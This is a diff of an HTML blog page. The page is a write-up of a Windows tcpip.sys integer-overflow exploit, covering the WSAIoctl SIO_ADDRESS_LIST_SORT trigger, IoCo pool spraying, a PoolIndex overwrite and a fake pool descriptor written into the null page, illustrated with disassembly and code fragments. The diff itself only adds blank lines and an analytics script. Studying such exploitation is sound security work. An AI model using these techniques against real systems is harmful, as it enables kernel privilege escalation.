@@ -171,9 +171,11 @@ IppSortDestinationAddresses(x,x,x)+3B   push    ebx
 IppSortDestinationAddresses(x,x,x)+3C   call    esi ; ExAllocatePoolWithTag(x,x,x)
 </code></pre></div>
 
+
 <p>You can reach this code using a <em>WSAIoctl</em> with the code <em>SIO_ADDRESS_LIST_SORT</em> using a call like this :</p>
 <div class="highlight"><pre><span></span><code>WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, NULL)
 </code></pre></div>
+
 
 <p>You have to pass the function a pointer to a <em>SOCKET_ADDRESS_LIST</em> (<em>pwn</em> in the example). This <em>SOCKET_ADDRESS_LIST</em> contains an <em>iAddressCount</em> field and <em>iAddressCount</em> <em>SOCKET_ADDRESS</em> structures. With a high <em>iAddressCount</em> value, the integer will wrap, thus triggering the wrong-sized allocation.  We can almost write anything in those structures. There are only two limitations : </p>
 <div class="highlight"><pre><span></span><code>IppFlattenAddressList(x,x)+25   lea     ecx, [ecx+ebx*8]
@@ -183,6 +185,7 @@ IppFlattenAddressList(x,x)+2C   jz      short loc_4DCA9
 IppFlattenAddressList(x,x)+9C   cmp     word ptr [edx], 17h
 IppFlattenAddressList(x,x)+A0   jnz     short loc_4DCA2
 </code></pre></div>
+
 
 <p>The copy will stop if those checks fail. That means that each <em>SOCKET_ADDRESS</em> has a length of 0x1c and that each <em>SOCKADDR</em> buffer pointed to by the socket address begins with a 0x17 byte. Long story short :</p>
 <ul>
@@ -212,6 +215,7 @@ sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
 WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, NULL)
 </code></pre></div>
 
+
 <h1 id="spraying-the-pool">Spraying the pool</h1>
 <h2 id="non-paged-objects">Non paged objects</h2>
 <p>There are several objects that we could easily use to manipulate the non-paged pool. For instance we could use semaphore objects or reserve objects.</p>
@@ -219,6 +223,7 @@ WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, N
 *85242d08 size:   68 previous size:   68  (Allocated) User 
 *850fcea8 size:   60 previous size:    8  (Allocated) IoCo
 </code></pre></div>
+
 
 <p>We are trying to overflow a pool chunk with a size being a multiple of 0x1c. As 0x1c*3=0x54, the driver is going to request 0x54 bytes and being therefore given a chunk of 0x60 bytes. This is exactly the size of an I/O completion reserve object. To allocate a IoCo, we just need to call <em>NtAllocateReserveObject</em> with the object type IOCO. To deallocate the IoCo, we could simply close the associate the handle. Doing this would make the object manager release the object. For more in-depth information about reserve objects, you can read j00ru’s article <a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf">[4]</a>.</p>
 <p>In order to spray, we are first going to allocate a lot of IoCo without releasing them so as to fill existing holes in the pool. After that, we want to allocate IoCo and make holes of 0x60 bytes. This is illustrated in the <em>sprayIoCo()</em> function of my PoC. Now we are able have an IoCo pool chunk following an Ipas pool chunk (as you might have noticed, ‘Ipas’ is the tag used by the tcpip driver). Therefore, we can easily corrupt its pool header.</p>
@@ -234,6 +239,7 @@ ExFreePoolWithTag(x,x)+644                  cmp     ebx, _PoolHitTag
 ExFreePoolWithTag(x,x)+64A                  jnz     short loc_5180E9
 ExFreePoolWithTag(x,x)+64C                  int     3               ; Trap to Debugger
 </code></pre></div>
+
 
 <p>As you can see on the listing above, <em>nt!PoolHitTag</em> is compared against the pool tag of the currently freed chunk. Notice the mask : it allows you to use the raw tag. (for instance ‘oooo’ instead of 0xef6f6f6f) By the way, you are not required to use the genuine tag. (eg : you can use ‘ooo’ for ‘IoCo’) Now you know that you can <em>ed nt!PoolHitTag ‘oooo’</em> to debug your exploit.</p>
 <h1 id="exploitation-technique">Exploitation technique</h1>
@@ -260,6 +266,7 @@ nt!_POOL_DESCRIPTOR
    +0x140 ListHeads        : [512] _LIST_ENTRY
 </code></pre></div>
 
+
 <p>A pool descriptor references free memory in a free list called <em>ListHeads</em>. The <em>PendingFrees</em> field references chunks of memory waiting to be freed to the free list. Pointers to pool descriptor structures are stored in arrays such as <em>PoolVector</em> (non-paged) or <em>ExpPagedPoolDescriptor</em> (paged). Each chunk of memory contains a header before the actual data. This is the <em>_POOL_HEADER</em>. It brings information such as the size of the block or the pool it belongs to.</p>
 <div class="highlight"><pre><span></span><code>0: kd&gt; dt _POOL_HEADER
 nt!_POOL_HEADER
@@ -273,12 +280,14 @@ nt!_POOL_HEADER
    +0x006 PoolTagHash      : Uint2B
 </code></pre></div>
 
+
 <h2 id="poolindex-overwrite">PoolIndex overwrite</h2>
 <p>The basic idea of this attack is to corrupt the <em>PoolIndex</em> field of a pool header. This field is used when deallocating paged pool chunks in order to know which pool descriptor it belongs to. It is used as an index in an array of pointers to pool descriptors. Thus, if an attacker is able to corrupt it, he can make the pool manager believe that a specific chunk belongs to another pool descriptor. For instance, one could reference a pool descriptor out of the bounds of the array. </p>
 <div class="highlight"><pre><span></span><code>0: kd&gt; dd ExpPagedPoolDescriptor
 82947ae0  84835000 84836140 84837280 848383c0
 82947af0  84839500 00000000 00000000 00000000
 </code></pre></div>
+
 
 <p>As there are always some null pointers after the array, it could be used to craft a fake pool descriptor in a user-allocated null page. </p>
 <h2 id="non-paged-pool-type">Non paged pool type</h2>
@@ -302,6 +311,7 @@ ExFreePoolWithTag(x,x)+491  test    edx, ecx
 ExFreePoolWithTag(x,x)+493  jnz     short loc_517F49
 </code></pre></div>
 
+
 <p>Later, if <em>ExpNumberOfNonPagedPools</em> equals 1, the correct pool descriptor will directly be taken from <em>nt!PoolVector[0]</em>. The PoolIndex is not used. </p>
 <div class="highlight"><pre><span></span><code>ExFreePoolWithTag(x,x)+5C8  loc_518064:
 ExFreePoolWithTag(x,x)+5C8  mov     eax, [esp+58h+watchMe]
@@ -323,6 +333,7 @@ ExFreePoolWithTag(x,x)+5F7  mov     eax, _ExpNonPagedPoolDescriptor[eax*4]
 ExFreePoolWithTag(x,x)+5FE  jmp     short loc_5180C7
 </code></pre></div>
 
+
 <p>Therefore, you have to make the pool manager believe that the chunk is located in paged memory. </p>
 <h2 id="crafting-a-fake-pool-descriptor">Crafting a fake pool descriptor</h2>
 <p>As we want a fake pool descriptor at null address. We just allocate this page and put a fake deferred free list and a fake ListHeads.</p>
@@ -338,6 +349,7 @@ ExFreePoolWithTag(x,x)+5FE  jmp     short loc_5180C7
 <span class="o">*</span><span class="p">(</span><span class="n">PINT</span><span class="p">)</span><span class="mh">0x1260</span> <span class="o">=</span> <span class="p">(</span><span class="n">INT</span><span class="p">)</span><span class="mh">0x060c0a0c</span><span class="p">;</span>
 <span class="o">*</span><span class="p">(</span><span class="n">PINT</span><span class="p">)</span><span class="mh">0x1264</span> <span class="o">=</span> <span class="p">(</span><span class="n">INT</span><span class="p">)</span><span class="mh">0x6f6f6f6f</span><span class="p">;</span>
 </code></pre></div>
+
 
 <h2 id="notes">Notes</h2>
 <p>It is interesting to note that this attack would not work with modern mitigations. Here are a few reasons : </p>
@@ -385,6 +397,14 @@ ExFreePoolWithTag(x,x)+5FE  jmp     short loc_5180C7
 
     </div><!--/.fluid-container-->
 
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src='https://www.googletagmanager.com/gtag/js?id=G-N8HQZ0EFSG'></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'UA-43481215-1');
+</script>
 
     <script src="../../../../../theme/js/jquery-1.7.2.min.js"></script>
     <script src="../../../../../theme/js/bootstrap.min.js"></script>
